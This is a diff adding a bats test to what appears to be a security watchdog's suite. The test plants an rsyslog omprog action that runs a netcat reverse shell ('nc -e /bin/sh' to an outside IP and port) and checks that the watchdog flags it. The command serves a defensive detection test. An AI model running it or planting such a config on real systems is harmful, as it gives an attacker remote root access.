@@ -280,3 +280,19 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in omprog binary: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. rsyslog omprog actions fire AS ROOT on
+    # every matching log event (template-pipe to the named binary).
+    # An attacker who can plant a binary at a writable-root path can
+    # trigger fast-recurring callbacks via routine log entries.
+    # Closes the nc reverse-shell sister axis on the rsyslog-exec
+    # surface alongside the omprog binary path family.
+    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'action(type="omprog" binary="/bin/sh" args="-c \\"nc -e /bin/sh 1.1.1.1 4444\\"")\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
